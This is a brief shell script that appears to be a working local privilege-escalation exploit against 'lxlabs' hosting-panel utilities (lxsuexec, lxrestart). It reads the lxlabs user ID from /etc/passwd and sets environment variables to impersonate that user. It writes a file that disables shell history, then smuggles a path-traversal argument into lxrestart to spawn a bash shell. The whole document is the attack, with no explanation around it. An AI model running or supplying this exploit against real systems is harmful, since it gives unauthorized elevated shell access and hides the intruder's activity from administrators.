LXLABS=`cat /etc/passwd | grep lxlabs | cut -d: -f3`
export MUID=$LXLABS
export GID=$LXLABS
export TARGET=/bin/sh
export CHECK_GID=0
export NON_RESIDENT=1
echo "unset HISTFILE HISTSAVE PROMPT_COMMAND TMOUT" >> /tmp/w00trc
echo "/usr/sbin/lxrestart '../../../bin/bash --init-file /tmp/w00trc #' " > /tmp/lol
lxsuexec /tmp/lol